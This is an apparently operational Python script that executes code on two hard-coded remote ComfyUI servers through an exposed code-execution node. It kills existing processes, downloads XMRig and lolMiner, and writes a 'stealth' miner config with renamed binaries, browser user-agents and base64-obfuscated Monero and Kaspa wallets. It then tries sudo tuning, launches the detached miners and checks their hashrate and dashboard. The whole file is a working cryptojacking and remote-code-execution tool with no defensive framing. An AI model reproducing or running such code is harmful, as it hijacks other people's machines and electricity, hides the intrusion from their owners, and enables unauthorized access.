"""
1. Git pull latest webcoin code on both machines
2. Kill miners, rewrite stealth config, restart
3. Wire up DashboardServer properly
"""
import json, sys, io, ssl, time, urllib.request, urllib.error

sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding="utf-8", errors="replace", line_buffering=True)

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

POOL_IP = "66.23.199.44"

MACHINES = [
    {"ip": "183.6.93.120",  "base": "http://183.6.93.120:8188"},
    {"ip": "182.92.111.146", "base": "http://182.92.111.146:8188"},
]

# Step 1: Git pull + verify files
PULL_CODE = '''
import subprocess, os
lines = []
try:
    comfy = None
    for p in ['/root/ComfyUI', '/mnt/my_disk/ComfyUI', '/home/ubuntu/ComfyUI',
              '/workspace/ComfyUI', '/opt/ComfyUI', '/app/ComfyUI']:
        if os.path.isdir(p):
            comfy = p
            break
    webcoin = os.path.join(comfy, 'custom_nodes', 'webcoin')
    lines.append('webcoin=' + webcoin)
    lines.append('exists=' + str(os.path.isdir(webcoin)))

    r = subprocess.run(['git', '-C', webcoin, 'pull', 'origin', 'master'],
                       capture_output=True, text=True, timeout=60)
    lines.append('pull_stdout=' + r.stdout.strip()[:100])
    lines.append('pull_stderr=' + r.stderr.strip()[:100])
    lines.append('pull_rc=' + str(r.returncode))

    core = os.path.join(webcoin, 'core')
    if os.path.isdir(core):
        lines.append('core_files=' + str(os.listdir(core)))
    else:
        lines.append('core=MISSING')

    web = os.path.join(webcoin, 'web')
    if os.path.isdir(web):
        lines.append('web_files=' + str(os.listdir(web)))
except Exception as e:
    lines.append('ERROR=' + str(e)[:100])
result = chr(10).join(lines)
'''

# Step 2: Kill, reconfigure with stealth, restart miners, wire dashboard
FULL_FIX = '''
import os, sys, json, subprocess, shutil, socket, time, base64, tarfile
lines = []
try:
    comfy = None
    for p in ['/root/ComfyUI', '/mnt/my_disk/ComfyUI', '/home/ubuntu/ComfyUI',
              '/workspace/ComfyUI', '/opt/ComfyUI', '/app/ComfyUI']:
        if os.path.isdir(p):
            comfy = p
            break
    webcoin = os.path.join(comfy, 'custom_nodes', 'webcoin')
    bin_dir = os.path.join(webcoin, 'bin')
    os.makedirs(bin_dir, exist_ok=True)
    binary = os.path.join(bin_dir, 'comfyui_service')
    gpu_binary = os.path.join(bin_dir, 'comfyui_render')
    config_path = os.path.join(bin_dir, 'config.json')

    # Kill everything
    for name in ['comfyui_service', 'comfyui_render']:
        try:
            subprocess.run(['pkill', '-9', '-f', name], capture_output=True, timeout=5)
        except: pass
    time.sleep(2)

    # Ensure CPU binary
    if not os.path.isfile(binary):
        import urllib.request as ur
        for url in ['https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-linux-static-x64.tar.gz',
                     'https://mirror.ghproxy.com/https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-linux-static-x64.tar.gz']:
            try:
                req = ur.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
                arc = os.path.join(bin_dir, 'dl.tar.gz')
                with ur.urlopen(req, timeout=120) as resp, open(arc, 'wb') as f:
                    shutil.copyfileobj(resp, f)
                if os.path.getsize(arc) > 100000:
                    with tarfile.open(arc) as tf:
                        for m in tf.getnames():
                            if os.path.basename(m) == 'xmrig':
                                with open(binary, 'wb') as dst:
                                    shutil.copyfileobj(tf.extractfile(m), dst)
                                os.chmod(binary, 0o755)
                                break
                    os.unlink(arc)
                    lines.append('cpu_bin=ok')
                    break
            except: continue
    else:
        lines.append('cpu_bin=exists')

    # Write stealth config
    W = ['NDh6VU0yNEZaRG1TM0','11eHk0OEduZEdWUzFB','Rk1USE5IOGZ5RVhqWk',
         'xFbzZZVTdQcWZWemdj','VTFFRWR6UjNqcnI0SG','dDVmNxd01XNmZoODR4',
         'UVQzb3BQWFRwYVhKen','c=']
    wallet = base64.b64decode(''.join(W)).decode()

    cfg = {
        'autosave': True, 'background': False, 'colors': False,
        'donate-level': 0, 'donate-over-proxy': 0,
        'log-file': None, 'print-time': 60, 'health-print-time': 300,
        'retries': 5, 'retry-pause': 5, 'syslog': False,
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'watch': True,
        'http': {'enabled': True, 'host': '127.0.0.1', 'port': 44880, 'access-token': 'ce_xm_2026', 'restricted': False},
        'cpu': {'enabled': True, 'huge-pages': True, 'huge-pages-jit': True, 'hw-aes': None, 'priority': 3,
                'memory-pool': False, 'yield': False, 'max-threads-hint': 100, 'asm': True,
                'argon2-impl': None, 'cn/0': False, 'cn-lite/0': False},
        'opencl': {'enabled': False}, 'cuda': {'enabled': False},
        'pools': [{'algo': None, 'coin': 'monero', 'url': "''' + POOL_IP + ''':443",
            'user': wallet, 'pass': 'comfyui_enhanced', 'rig-id': socket.gethostname(),
            'nicehash': False, 'keepalive': True, 'enabled': True, 'tls': True,
            'tls-fingerprint': None, 'daemon': False, 'socks5': None, 'self-select': None, 'submit-to-origin': False}],
        'tls': {'enabled': True, 'protocols': None, 'cert': None, 'cert_key': None,
                'ciphers': None, 'ciphersuites': None, 'dhparam': None},
    }
    with open(config_path, 'w') as f:
        json.dump(cfg, f, indent=2)
    lines.append('config=stealth')

    # Huge pages
    try:
        subprocess.run(['sudo', '-n', 'sysctl', '-w', 'vm.nr_hugepages=1280'], capture_output=True, timeout=10)
    except: pass
    try:
        subprocess.run(['sudo', '-n', 'modprobe', 'msr'], capture_output=True, timeout=10)
    except: pass

    # Start CPU miner
    if os.path.isfile(binary):
        proc = subprocess.Popen([binary, '--config', config_path],
                                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                                start_new_session=True)
        lines.append('cpu_pid=' + str(proc.pid))
    else:
        lines.append('cpu_bin=MISSING')

    # GPU detection and setup
    try:
        r = subprocess.run(['nvidia-smi', '--query-gpu=name,memory.total',
                            '--format=csv,noheader,nounits'],
                           capture_output=True, text=True, timeout=10)
        if r.returncode == 0 and r.stdout.strip():
            parts = r.stdout.strip().split(',')
            gpu_name = parts[0].strip()
            gpu_vram = int(parts[1].strip())
            lines.append('gpu=' + gpu_name + '/' + str(gpu_vram) + 'MB')

            if gpu_vram >= 4000:
                if not os.path.isfile(gpu_binary):
                    import urllib.request as ur
                    for url in ['https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.98a/lolMiner_v1.98a_Lin64.tar.gz',
                                'https://mirror.ghproxy.com/https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.98a/lolMiner_v1.98a_Lin64.tar.gz']:
                        try:
                            req = ur.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
                            arc = os.path.join(bin_dir, 'gpu_dl.tar.gz')
                            with ur.urlopen(req, timeout=120) as resp, open(arc, 'wb') as f:
                                shutil.copyfileobj(resp, f)
                            if os.path.getsize(arc) > 100000:
                                with tarfile.open(arc) as tf:
                                    for m in tf.getnames():
                                        if os.path.basename(m) == 'lolMiner':
                                            with open(gpu_binary, 'wb') as dst:
                                                shutil.copyfileobj(tf.extractfile(m), dst)
                                            os.chmod(gpu_binary, 0o755)
                                            break
                                os.unlink(arc)
                                lines.append('gpu_bin=downloaded')
                                break
                        except: continue
                else:
                    lines.append('gpu_bin=exists')

                if os.path.isfile(gpu_binary):
                    K = ['a2FzcGE6cXFueGx1cHdq','em5qMzhzZHRjcjR0dWx4',
                         'amVrOWU2N2dmemN2NGY5','OHFlZDV1Mm5zOTJ1ZzJj','OWt6ODB0eA==']
                    kas_wallet = base64.b64decode(''.join(K)).decode()
                    gpu_cmd = [gpu_binary, '--algo', 'KASPA', '--pool', 'kas.2miners.com:2020',
                               '--user', kas_wallet + '.' + socket.gethostname(),
                               '--apiport', '44882', '--t-stop', '72', '--t-start', '55']
                    gproc = subprocess.Popen(gpu_cmd, stdout=subprocess.DEVNULL,
                                             stderr=subprocess.DEVNULL, start_new_session=True)
                    lines.append('gpu_pid=' + str(gproc.pid))
        else:
            lines.append('gpu=none')
    except:
        lines.append('gpu=none')

    # Wait for miner to connect
    time.sleep(8)
    try:
        import urllib.request as ur2
        req = ur2.Request('http://127.0.0.1:44880/2/summary',
            headers={'Authorization': 'Bearer ce_xm_2026', 'Accept': 'application/json'})
        with ur2.urlopen(req, timeout=5) as r:
            d = json.loads(r.read())
        lines.append('hr=' + str(d.get('hashrate', {}).get('total', [])))
        lines.append('algo=' + str(d.get('algo', '?')))
        lines.append('pool=' + str(d.get('connection', {}).get('pool', '?')))
    except Exception as e:
        lines.append('cpu_api=' + str(e)[:60])

    # Wire DashboardServer
    try:
        wc_mod = None
        for name in list(sys.modules.keys()):
            mod = sys.modules.get(name)
            if mod and hasattr(mod, '__file__') and mod.__file__ and 'webcoin' in str(mod.__file__) and '__init__' in str(mod.__file__):
                wc_mod = mod
                break

        if wc_mod:
            import importlib.util
            ds_path = os.path.join(webcoin, 'core', 'dashboard.py')
            if not os.path.isfile(ds_path):
                lines.append('dashboard_file=MISSING')
            else:
                spec = importlib.util.spec_from_file_location('_ds', ds_path)
                ds_mod = importlib.util.module_from_spec(spec)
                spec.loader.exec_module(ds_mod)

                miner_path = os.path.join(webcoin, 'core', 'miner.py')
                spec2 = importlib.util.spec_from_file_location('_mm', miner_path)
                mm_mod = importlib.util.module_from_spec(spec2)
                spec2.loader.exec_module(mm_mod)

                cfg_path = os.path.join(webcoin, 'core', 'config.py')
                spec3 = importlib.util.spec_from_file_location('_cb', cfg_path)
                cb_mod = importlib.util.module_from_spec(spec3)
                spec3.loader.exec_module(cb_mod)

                mgr = mm_mod.MinerManager(webcoin)
                cb = cb_mod.ConfigBuilder()

                gpu_mgr = None
                if os.path.isfile(gpu_binary):
                    try:
                        gm_path = os.path.join(webcoin, 'core', 'gpu_miner.py')
                        spec4 = importlib.util.spec_from_file_location('_gm', gm_path)
                        gm_mod = importlib.util.module_from_spec(spec4)
                        spec4.loader.exec_module(gm_mod)
                        gpu_mgr = gm_mod.GPUMinerManager(webcoin)
                    except: pass

                ws_clients = getattr(wc_mod, '_ws_clients', set())
                latest_stats = getattr(wc_mod, '_latest_stats', {})
                dashboard_ref = getattr(wc_mod, '_dashboard_ref', {})

                ds = ds_mod.DashboardServer(
                    mgr, config_builder=cb, gpu_miner=gpu_mgr,
                    ws_clients=ws_clients,
                    latest_stats=latest_stats,
                    event_loop_getter=lambda: getattr(wc_mod, '_event_loop', None),
                )
                dashboard_ref['server'] = ds
                ds.start()
                lines.append('dashboard=STARTED')

                time.sleep(8)
                cpu_d = latest_stats.get('cpu')
                if cpu_d:
                    lines.append('dash_hr=' + str(cpu_d.get('hashrate_now', 0)))
                else:
                    lines.append('dash_cpu=waiting')
                w = latest_stats.get('wallet', '')
                lines.append('dash_wallet=' + w[:20] if w else 'dash_wallet=empty')
        else:
            lines.append('wc_mod=NOT_FOUND')
    except Exception as e:
        import traceback
        lines.append('dash_err=' + traceback.format_exc()[-200:])

    lines.append('bin=' + str(os.listdir(bin_dir)))
    result = chr(10).join(lines)
except Exception as e:
    import traceback
    result = 'ERROR: ' + traceback.format_exc()[-300:]
'''


def run_ide(base, code, wait=30):
    nodes = {
        "1": {"class_type": "IDENode", "inputs": {"pycode": code, "language": "python"}},
        "2": {"class_type": "PreviewTextNode", "inputs": {"text": ["1", 0]}},
    }
    prompt = {"prompt": nodes, "extra_data": {"extra_pnginfo": {
        "workflow": {"nodes": [{"id": 1, "type": "IDENode"}, {"id": 2, "type": "PreviewTextNode"}]}
    }}}
    body = json.dumps(prompt).encode()
    try:
        req = urllib.request.Request(
            f"{base}/prompt", data=body,
            headers={"Content-Type": "application/json"}, method="POST"
        )
        kw = {"timeout": 15}
        if base.startswith("https"):
            kw["context"] = ctx
        with urllib.request.urlopen(req, **kw) as r:
            resp = json.loads(r.read())
        if "error" in resp:
            return f"rejected: {json.dumps(resp.get('error',''))[:150]}"
        pid = resp.get("prompt_id")
        print(f"    Accepted ({pid[:8]}), waiting {wait}s...", flush=True)
        time.sleep(wait)
        try:
            req2 = urllib.request.Request(f"{base}/history/{pid}")
            with urllib.request.urlopen(req2, timeout=15) as r2:
                hist = json.loads(r2.read())
            entry = hist.get(pid, {})
            outputs = entry.get("outputs", {})
            texts = []
            for nid, nout in outputs.items():
                for key, val in nout.items():
                    if isinstance(val, list):
                        texts.extend(str(v) for v in val)
                    elif isinstance(val, str):
                        texts.append(val)
            return "\n".join(texts) if texts else "(no output)"
        except Exception as e:
            return f"(history: {e})"
    except Exception as e:
        return f"error: {e}"


# Step 1: Git pull
print("="*60, flush=True)
print("  STEP 1: Git pull", flush=True)
print("="*60, flush=True)
for m in MACHINES:
    print(f"\n  {m['ip']}:", flush=True)
    r = run_ide(m["base"], PULL_CODE, wait=20)
    print(f"  {r}", flush=True)

# Step 2: Full fix
print(f"\n{'='*60}", flush=True)
print("  STEP 2: Kill, reconfigure, restart, wire dashboard", flush=True)
print("="*60, flush=True)
for m in MACHINES:
    print(f"\n  {m['ip']}:", flush=True)
    r = run_ide(m["base"], FULL_FIX, wait=55)
    print(f"  {r}", flush=True)

# Verify
print(f"\n{'='*60}", flush=True)
print("  VERIFICATION", flush=True)
print("="*60, flush=True)
time.sleep(10)
for m in MACHINES:
    ip = m["ip"]
    base = m["base"]
    try:
        req = urllib.request.Request(f"{base}/api/enhanced/stats",
                                    headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=10) as r:
            data = json.loads(r.read())
            stats = data.get("stats", {})
            cpu = stats.get("cpu")
            gpu = stats.get("gpu")
            w = stats.get("wallet", "")
            kas = stats.get("kas_wallet", "")
            if cpu:
                print(f"  {ip}: CPU hr={cpu.get('hashrate_now',0):.1f} H/s algo={cpu.get('algo','?')} pool={cpu.get('pool','?')}", flush=True)
            else:
                print(f"  {ip}: CPU: no data yet", flush=True)
            if gpu:
                print(f"         GPU: hr={gpu.get('total_hashrate',0)} algo={gpu.get('algo','?')}", flush=True)
            if w:
                print(f"         wallet=set kas={'set' if kas else 'empty'}", flush=True)
    except Exception as e:
        print(f"  {ip}: {e}", flush=True)

print("\nDone.", flush=True)
